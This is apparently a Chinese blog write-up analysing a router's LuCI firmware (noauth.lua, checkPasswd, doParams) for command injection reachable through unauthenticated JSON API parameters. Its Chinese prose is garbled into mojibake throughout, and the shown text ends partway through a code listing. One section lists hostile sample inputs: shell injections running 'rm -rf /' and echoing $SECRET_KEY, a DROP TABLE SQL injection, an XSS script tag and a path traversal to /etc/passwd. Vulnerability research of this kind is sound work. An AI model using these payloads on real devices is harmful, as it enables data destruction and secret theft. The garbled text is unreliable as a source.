å‡½æ•°ç”¨äºå®‰å…¨è°ƒç”¨æ–¹æ³•ï¼Œå¹¶å¤„ç†å¯èƒ½çš„é”™è¯¯ã€‚</p></li><li><p>å®ƒä½¿ç”¨ <code>luci.util.copcall</code> æ•è·è°ƒç”¨ä¸­çš„é”™è¯¯ï¼Œå¹¶æ ¹æ®è°ƒç”¨ç»“æœç”Ÿæˆå“åº”ã€‚</p></li></ul><p>å¯ä»¥å¾—çŸ¥è¿™é‡Œ<strong>é€šè¿‡<code>JSON</code>æ•°æ®çš„<code>method</code>å­—æ®µå®šä½å¹¶è°ƒç”¨<code>noauth.lua</code>ä¸­å¯¹åº”çš„å‡½æ•°ï¼ŒåŒæ—¶å°†<code>Json</code>æ•°æ®çš„<code>params</code>å­—æ®µå†…å®¹ä½œä¸ºå‚æ•°ä¼ å…¥</strong></p><h3 id="åˆ†ænoauth-lua-å¯»æ‰¾å¯ç–‘æ¼æ´çš„å…¥å£"><a href="#åˆ†ænoauth-lua-å¯»æ‰¾å¯ç–‘æ¼æ´çš„å…¥å£" class="headerlink" title="åˆ†ænoauth.lua(å¯»æ‰¾å¯ç–‘æ¼æ´çš„å…¥å£)"></a>åˆ†ænoauth.lua(å¯»æ‰¾å¯ç–‘æ¼æ´çš„å…¥å£)</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>(<span class="string">&quot;luci.modules.noauth&quot;</span>, <span class="built_in">package</span>.<span class="built_in">seeall</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ç™»å½•</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> disp = <span class="built_in">require</span>(<span class="string">&quot;luci.dispatcher&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> common = <span class="built_in">require</span>(<span class="string">&quot;luci.modules.common&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span>(<span class="string">&quot;luci.utils.tool&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> params.password <span class="keyword">and</span> tool.includeXxs(params.password) <span class="keyword">then</span></span><br><span class="line">        tool.eweblog(<span class="string">&quot;INVALID DATA&quot;</span>, <span class="string">&quot;LOGIN FAILED&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> authOk</span><br><span class="line">    <span class="keyword">local</span> ua = <span class="built_in">os</span>.<span class="built_in">getenv</span>(<span class="string">&quot;HTTP_USER_AGENT&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;unknown brower (ua is nil)&quot;</span></span><br><span class="line">    tool.eweblog(ua, <span class="string">&quot;LOGIN UA&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> checkStat = &#123;</span><br><span class="line">        password = params.password,</span><br><span class="line">        username = <span class="string">&quot;admin&quot;</span>, <span class="comment">-- params.username,</span></span><br><span class="line">        encry = params.encry,</span><br><span class="line">        limit = params.limit</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">local</span> authres, reason = tool.checkPasswd(checkStat)</span><br><span class="line">    <span class="keyword">local</span> log_opt = &#123;username = params.username, level = <span class="string">&quot;auth.notice&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> authres <span class="keyword">then</span></span><br><span class="line">        authOk = disp.writeSid(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">        <span class="comment">-- æ‰‹åŠ¨ç™»å½•æ—¶è®¾ç½®æ—¶é—´</span></span><br><span class="line">        <span class="keyword">if</span> params.<span class="built_in">time</span> <span class="keyword">and</span> <span class="built_in">tonumber</span>(params.<span class="built_in">time</span>) <span class="keyword">then</span></span><br><span class="line">            common.setSysTime(&#123;<span class="built_in">time</span> = params.<span class="built_in">time</span>&#125;)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        log_opt.action = <span class="string">&quot;login-success&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        log_opt.action = <span class="string">&quot;login-fail&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    tool.write_log(log_opt)</span><br><span class="line">    <span class="keyword">return</span> authOk</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- å•ç‚¹ç™»å½•</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">singleLogin</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> sauth = luci.sauth</span><br><span class="line">    <span class="keyword">local</span> fs = <span class="built_in">require</span> <span class="string">&quot;nixio.fs&quot;</span></span><br><span class="line">    <span class="keyword">local</span> <span class="built_in">config</span> = <span class="built_in">require</span>(<span class="string">&quot;luci.config&quot;</span>)</span><br><span class="line">    <span class="built_in">config</span>.sauth = <span class="built_in">config</span>.sauth <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">local</span> sessionpath = <span class="built_in">config</span>.sauth.sessionpath</span><br><span class="line">    <span class="keyword">if</span> sauth.sane() <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">local</span> id</span><br><span class="line">        <span class="keyword">for</span> id <span class="keyword">in</span> fs.dir(sessionpath) <span class="keyword">do</span></span><br><span class="line">            sauth.kill(id)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- ç½‘ç»œåˆå¹¶</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> cmd = <span class="built_in">require</span> <span class="string">&quot;luci.modules.cmd&quot;</span></span><br><span class="line">    <span class="keyword">return</span> cmd.devSta.set(&#123;device = <span class="string">&quot;pc&quot;</span>, <span class="built_in">module</span> = <span class="string">&quot;networkId_merge&quot;</span>, data = params, async = <span class="literal">true</span>&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- ping checknet</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNet</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">if</span> params.host <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">local</span> tool = <span class="built_in">require</span>(<span class="string">&quot;luci.utils.tool&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">string</span>.<span class="built_in">len</span>(params.host) &gt; <span class="number">50</span> <span class="keyword">or</span> <span class="keyword">not</span> tool.checkIp(params.host) <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">return</span> &#123;connect = <span class="literal">false</span>, msg = <span class="string">&quot;host illegal&quot;</span>&#125;</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">local</span> json = <span class="built_in">require</span> <span class="string">&quot;luci.json&quot;</span></span><br><span class="line">        <span class="keyword">local</span> _curl =</span><br><span class="line">            <span class="string">&#x27;curl -s -k -X POST \&#x27;http://%s/cgi-bin/luci/api/auth\&#x27; -H content-type:application/json -d \&#x27;&#123;&quot;method&quot;:&quot;checkNet&quot;&#125;\&#x27;&#x27;</span> %</span><br><span class="line">            params.host</span><br><span class="line">        <span class="keyword">local</span> _data = json.decode(luci.sys.exec(_curl))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(_data) == <span class="string">&quot;table&quot;</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">type</span>(_data.data) == <span class="string">&quot;table&quot;</span> <span class="keyword">then</span></span><br><span class="line">                <span class="keyword">return</span> _data.data</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">return</span> &#123;connect = <span class="literal">false</span>&#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> &#123;connect = <span class="literal">false</span>&#125;</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> &#123;connect = <span class="literal">true</span>&#125;</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>å‘<a href="https://bbs.kanxue.com/thread-277386.htm#msg_header_h2_3">winmtå¸ˆå‚…</a>å­¦ä¹ </p><p>åœ¨noauth.luaä¸­ï¼Œæœ‰<code>login</code>ï¼Œ<code>singleLogin</code>ï¼Œ<code>merge</code>å’Œ<code>checkNet</code>å››ä¸ªæ–¹æ³•ã€‚å…¶ä¸­ï¼Œ<code>singleLogin</code>å‡½æ•°æ— å¯æ§åˆ¶çš„å‚æ•°ï¼Œä¸ç”¨çœ‹ï¼›<code>checkNet</code>å‡½æ•°ä¸­å‚æ•°å¯æ§çš„å­—æ®µåªæœ‰<code>params.host</code>ï¼Œå¹¶æ‹¼æ¥å…¥äº†å‘½ä»¤å­—ç¬¦ä¸²æ‰§è¡Œï¼Œä½†æ˜¯åœ¨ä¹‹å‰æœ‰<code>tool.checkIp(params.host)</code>å¯¹å…¶çš„åˆæ³•æ€§è¿›è¡Œäº†æ£€æŸ¥ï¼Œæ— æ³•ç»•è¿‡ã€‚</p><p>é‚£ä¹ˆæ€è€ƒå¦‚æœæ²¡æœ‰å¯¹hostè¿›è¡Œåˆæ³•æ€§æ£€æŸ¥æœ‰ä»€ä¹ˆåˆ©ç”¨æ‰‹æ®µå‘¢ï¼Ÿ</p><ol><li><strong>è¾“å…¥éªŒè¯å’Œæ³¨å…¥æ”»å‡»</strong>ï¼š<ul><li>SQLæ³¨å…¥ï¼šå¦‚æœéæ³•åœ°å€æœªè¢«æ­£ç¡®éªŒè¯å¹¶ç›´æ¥ç”¨äºæ•°æ®åº“æŸ¥è¯¢ï¼Œæ”»å‡»è€…å¯èƒ½æ„é€ æ¶æ„è¾“å…¥æ¥æ‰§è¡Œä»»æ„SQLä»£ç ã€‚<ul><li>ä¾‹å¦‚ï¼š<code>params.host = &quot;192.168.1.1&#39;; DROP TABLE users; --&quot;</code></li></ul></li><li>å‘½ä»¤æ³¨å…¥ï¼šå¦‚æœéæ³•åœ°å€ç”¨äºç³»ç»Ÿå‘½ä»¤æˆ–è„šæœ¬æ‰§è¡Œï¼Œæ”»å‡»è€…å¯èƒ½æ³¨å…¥æ¶æ„å‘½ä»¤ã€‚<ul><li>ä¾‹å¦‚ï¼š<code>params.host = &quot;192.168.1.1; rm -rf / --&quot;</code></li><li><code>params.host = &quot;192.168.1.1;rm -rf /*&#39;#&quot;</code>åŠ ä¸ªâ€™è®©urlé—­åˆ#æ³¨é‡Šæ‰ä¹‹åçš„ç›´åˆ°â€™</li></ul></li></ul></li><li><strong>è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰</strong>ï¼š<ul><li>å¦‚æœéæ³•åœ°å€æœªè¢«æ­£ç¡®è¿‡æ»¤å¹¶æ˜¾ç¤ºåœ¨ç½‘é¡µä¸­ï¼Œæ”»å‡»è€…å¯èƒ½æ’å…¥æ¶æ„è„šæœ¬ï¼Œå¯¼è‡´XSSæ”»å‡»ã€‚<ul><li>ä¾‹å¦‚ï¼š<code>params.host = &quot;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;&quot;</code></li></ul></li></ul></li><li><strong>è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰</strong>ï¼š<ul><li>å¦‚æœéæ³•åœ°å€ç”¨äºç”Ÿæˆæˆ–å¤„ç†URLï¼Œæ”»å‡»è€…å¯èƒ½æ„é€ æ¶æ„è¯·æ±‚ä»¥æ‰§è¡ŒCSRFæ”»å‡»ã€‚<ul><li>ä¾‹å¦‚ï¼š<code>params.host = &quot;example.com&quot;;</code> è¢«æ›¿æ¢ä¸ºæ”»å‡»è€…æ§åˆ¶çš„åŸŸåã€‚</li></ul></li></ul></li><li><strong>æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»</strong>ï¼š<ul><li>å¤„ç†éæ³•åœ°å€å¯èƒ½å¯¼è‡´æœåŠ¡å™¨èµ„æºè€—å°½ï¼Œå¯¼è‡´æœåŠ¡ä¸å¯ç”¨ã€‚ä¾‹å¦‚ï¼Œå¤„ç†ä¸€ä¸ªéå¸¸é•¿çš„å­—ç¬¦ä¸²æˆ–å¤æ‚çš„æ­£åˆ™è¡¨è¾¾å¼å¯èƒ½æ¶ˆè€—å¤§é‡CPUå’Œå†…å­˜èµ„æºã€‚</li></ul></li><li><strong>ä¿¡æ¯æ³„éœ²</strong>ï¼š<ul><li>å¦‚æœéæ³•åœ°å€åŒ…å«æ•æ„Ÿä¿¡æ¯ä¸”æœªè¢«æ­£ç¡®å¤„ç†ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€‚<ul><li>ä¾‹å¦‚ï¼š<code>params.host = &quot;192.168.1.1; echo $SECRET_KEY&quot;</code></li></ul></li></ul></li><li><strong>è·¯å¾„éå†æ”»å‡»</strong>ï¼š<ul><li>å¦‚æœéæ³•åœ°å€ç”¨äºæ–‡ä»¶è·¯å¾„æ“ä½œï¼Œæ”»å‡»è€…å¯èƒ½åˆ©ç”¨è·¯å¾„éå†æ¥è®¿é—®æˆ–ä¿®æ”¹ä¸åº”è®¿é—®çš„æ–‡ä»¶ã€‚<ul><li>ä¾‹å¦‚ï¼š<code>params.host = &quot;../../../../etc/passwd&quot;</code></li></ul></li></ul></li></ol><p>è¿™å°±æ˜¯webå—å¤ªé«˜çº§äº†woc</p><p>å¯æƒœå¯¹hostå­—æ®µè¿›è¡Œäº†check</p><p>é‚£ä¹ˆæ¥çœ‹loginå‡½æ•°ï¼Œä¹ä¸€çœ‹å¯ä»¥æ§åˆ¶çš„å­—ç¬¦ååˆ†çš„å¤šï¼Œparams.passwordï¼Œparams.timeï¼Œparams.encryï¼Œparams.limit</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- ç™»å½•</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> disp = <span class="built_in">require</span>(<span class="string">&quot;luci.dispatcher&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> common = <span class="built_in">require</span>(<span class="string">&quot;luci.modules.common&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span>(<span class="string">&quot;luci.utils.tool&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> params.password <span class="keyword">and</span> tool.includeXxs(params.password) <span class="keyword">then</span>  <span class="comment">--passwordè¿‡æ»¤å±é™©å­—ç¬¦ï¼ŒçŒœæµ‹ä¹‹åæœ‰å‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line">        tool.eweblog(<span class="string">&quot;INVALID DATA&quot;</span>, <span class="string">&quot;LOGIN FAILED&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> authOk</span><br><span class="line">    <span class="keyword">local</span> ua = <span class="built_in">os</span>.<span class="built_in">getenv</span>(<span class="string">&quot;HTTP_USER_AGENT&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;unknown brower (ua is nil)&quot;</span></span><br><span class="line">    tool.eweblog(ua, <span class="string">&quot;LOGIN UA&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> checkStat = &#123;</span><br><span class="line">        password = params.password,</span><br><span class="line">        username = <span class="string">&quot;admin&quot;</span>, <span class="comment">-- params.username,</span></span><br><span class="line">        encry = params.encry,</span><br><span class="line">        limit = params.limit</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">local</span> authres, reason = tool.checkPasswd(checkStat)</span><br><span class="line">    <span class="keyword">local</span> log_opt = &#123;username = params.username, level = <span class="string">&quot;auth.notice&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> authres <span class="keyword">then</span></span><br><span class="line">        authOk = disp.writeSid(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">        <span class="comment">-- æ‰‹åŠ¨ç™»å½•æ—¶è®¾ç½®æ—¶é—´</span></span><br><span class="line">        <span class="keyword">if</span> params.<span class="built_in">time</span> <span class="keyword">and</span> <span class="built_in">tonumber</span>(params.<span class="built_in">time</span>) <span class="keyword">then</span></span><br><span class="line">            common.setSysTime(&#123;<span class="built_in">time</span> = params.<span class="built_in">time</span>&#125;)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        log_opt.action = <span class="string">&quot;login-success&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        log_opt.action = <span class="string">&quot;login-fail&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    tool.write_log(log_opt)</span><br><span class="line">    <span class="keyword">return</span> authOk</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> params.password <span class="keyword">and</span> tool.includeXxs(params.password) <span class="keyword">then</span>  <span class="comment">--passwordè¿‡æ»¤å±é™©å­—ç¬¦ï¼ŒçŒœæµ‹ä¹‹åæœ‰å‘½ä»¤æ‰§è¡Œ</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿‡æ»¤äº†</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">includeXxs</span><span class="params">(str)</span></span></span><br><span class="line">    <span class="keyword">local</span> ngstr = <span class="string">&quot;[`&amp;$;|]&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>.<span class="built_in">match</span>(str, ngstr) ~= <span class="literal">nil</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>winmtå¸ˆå‚…è¯´å°‘è¿‡æ»¤äº†ä¸€ä¸ª\næˆ–è®¸æœªæ¥æœ‰å‘½ä»¤æ³¨å…¥çš„å¯èƒ½ï¼Œç±»ä¼¼ï¼›è¿™ä¸ªæ•ˆæœ</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> authres, reason = tool.checkPasswd(checkStat)</span><br></pre></td></tr></table></figure><p>è¿™è¾¹æœ‰ä¸ªtoolè°ƒç”¨checkPasswd</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- æ£€æµ‹å¯†ç æ˜¯å¦æ­£ç¡®</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkPasswd</span><span class="params">(checkStat)</span></span></span><br><span class="line">    <span class="keyword">local</span> cmd = <span class="built_in">require</span>(<span class="string">&quot;luci.modules.cmd&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> _data = &#123;</span><br><span class="line">        <span class="built_in">type</span> = checkStat.encry <span class="keyword">and</span> <span class="string">&quot;enc&quot;</span> <span class="keyword">or</span> <span class="string">&quot;noenc&quot;</span>,</span><br><span class="line">        password = checkStat.password,</span><br><span class="line">        name = checkStat.username,</span><br><span class="line">        limit = checkStat.limit <span class="keyword">and</span> <span class="string">&quot;true&quot;</span> <span class="keyword">or</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">local</span> _check = cmd.devSta.get(&#123;<span class="built_in">module</span> = <span class="string">&quot;adminCheck&quot;</span>, device = <span class="string">&quot;pc&quot;</span>, data = _data&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(_check) == <span class="string">&quot;table&quot;</span> <span class="keyword">and</span> _check.result == <span class="string">&quot;success&quot;</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>, _check.reason</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>ä¼šå‘ç°encryå­—æ®µå’Œlimitå­—æ®µéƒ½å˜æˆäº†åŠ å¯†æˆ–è€…ä¸åŠ å¯†ï¼ŒçœŸæˆ–è€…å‡ï¼Œå¥½åƒå˜å¾—ä¸å¯æ§äº†</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> _check = cmd.devSta.get(&#123;<span class="built_in">module</span> = <span class="string">&quot;adminCheck&quot;</span>, device = <span class="string">&quot;pc&quot;</span>, data = _data&#125;)  <span class="comment">--ä¼ å…¥çš„å‚æ•°ä¸ºjson</span></span><br></pre></td></tr></table></figure><p>è°ƒç”¨äº†cmdçš„devSta.get</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> opt[i] == <span class="string">&quot;get&quot;</span> <span class="keyword">then</span></span><br><span class="line">    devCap[opt[i]] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">        <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_cap&quot;</span></span><br><span class="line">        params.method = opt[i]</span><br><span class="line">        params.cfg_cmd = <span class="string">&quot;dev_cap&quot;</span></span><br><span class="line">        <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">        <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, ip, password)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p> å®ƒæ˜¯é¦–å…ˆä¼šå°†paramsä¼ å…¥doParamsè§£æï¼Œä¹‹åç”¨fetch</p><p>é‚£ä¹ˆæ¥åˆ†æä¸€ä¸‹doParamså‡½æ•°</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">doParams</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="built_in">require</span> <span class="string">&quot;luci.json&quot;</span></span><br><span class="line">    <span class="comment">-- webæ¥å£è°ƒç”¨å…¨éƒ¨å»æ‰æ—¶é—´ï¼Œå¼ºåˆ¶forceè®¾ç½®ä¸‹å»</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(params.data) == <span class="string">&quot;table&quot;</span> <span class="keyword">then</span>    <span class="comment">--å¦‚æœæ˜¯tableè¡¨é‚£ä¹ˆèµ‹å€¼0</span></span><br><span class="line">        params.data.currentTime = <span class="literal">nil</span></span><br><span class="line">        params.data.configTime = <span class="literal">nil</span></span><br><span class="line">        params.data.configId = <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span> <span class="string">&quot;luci.utils.tool&quot;</span></span><br><span class="line">    <span class="keyword">if</span> tool.includeXxs(params.<span class="built_in">module</span>) <span class="keyword">or</span> tool.includeXxs(params.method) <span class="keyword">then</span>     <span class="comment">--è¿‡æ»¤å±é™©ç¬¦å·</span></span><br><span class="line">        params.<span class="built_in">module</span> = <span class="string">&quot;illegalMoule&quot;</span></span><br><span class="line">        params.method = <span class="string">&quot;illegalMethod&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> params.<span class="built_in">module</span> <span class="keyword">or</span> <span class="keyword">not</span> params.method) <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;please input module&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">local</span> data, back, ip, password = <span class="literal">nil</span>, <span class="literal">nil</span>, <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">local</span> _shell = params.cfg_cmd .. <span class="string">&quot; &quot;</span> .. params.method .. <span class="string">&quot; --module &#x27;&quot;</span> .. params.<span class="built_in">module</span> .. <span class="string">&quot;&#x27;&quot;</span>   <span class="comment">--æ„å»ºshell</span></span><br><span class="line">        <span class="comment">-- è¿œç¨‹ä»£ç†è°ƒç”¨</span></span><br><span class="line">        <span class="keyword">if</span> params.remoteIp <span class="keyword">then</span></span><br><span class="line">            _shell = _shell .. <span class="string">&quot; -i &#x27;&quot;</span> .. params.remoteIp .. <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">            ip = params.remoteIp</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">if</span> params.remotePwd <span class="keyword">and</span> <span class="keyword">not</span> (params.cur) <span class="keyword">then</span></span><br><span class="line">            _shell = _shell .. <span class="string">&quot; -p &#x27;&quot;</span> .. params.remotePwd .. <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">            password = params.remotePwd</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">if</span> params.data <span class="keyword">then</span>               <span class="comment">--å¤„ç†data</span></span><br><span class="line">            data = luci.json.encode(params.data)    <span class="comment">--dataä¾¿æ˜¯ä¸Šæ–‡çš„passwdå­—æ®µï¼Œè¿›è¡Œäº†jsonç¼–ç ï¼ˆunicodeåŠ å¯†ï¼‰</span></span><br><span class="line">            _shell = _shell .. <span class="string">&quot; &#x27;&quot;</span> .. data .. <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span 